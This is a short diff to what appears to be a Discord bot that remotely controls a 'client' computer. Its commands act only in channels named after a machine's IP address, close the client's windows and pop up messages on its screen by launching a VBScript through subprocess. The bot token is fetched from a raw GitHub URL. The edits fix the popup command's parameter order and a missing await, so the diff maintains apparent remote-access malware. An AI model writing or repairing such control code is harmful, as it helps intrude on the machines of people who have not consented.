@@ -376,7 +376,7 @@ async def close_selected_window(interaction : Interaction):
         await interaction.response.send_message("Select a window to close:", view=WindowView())
 
 @client.slash_command(guild_ids=testServerId, description="Pops up a message on the client's screen.")
-async def popup(interaction : Interaction, window_title: Optional[str], message: str, repeat: Optional[int]):
+async def popup(interaction : Interaction, message: str, window_title: Optional[str], repeat: Optional[int]):
     category = interaction.channel.category
     if str(category) == str(ip):
         user_id = interaction.user.id
@@ -394,7 +394,7 @@ async def popup(interaction : Interaction, window_title: Optional[str], message:
 
         subprocess.Popen(["wscript", os.path.join(target_path, "skibidi-mainmain", "popup", "popup.vbs")], shell=True)
         
-        interaction.response.send_message(f"Popup window succesfully opened with message: {message}")
+        await interaction.response.send_message(f"Popup window succesfully opened with message: {message}")
 
 
 r = requests.get("https://raw.githubusercontent.com/noel-create/skibidi/refs/heads/main/tok")
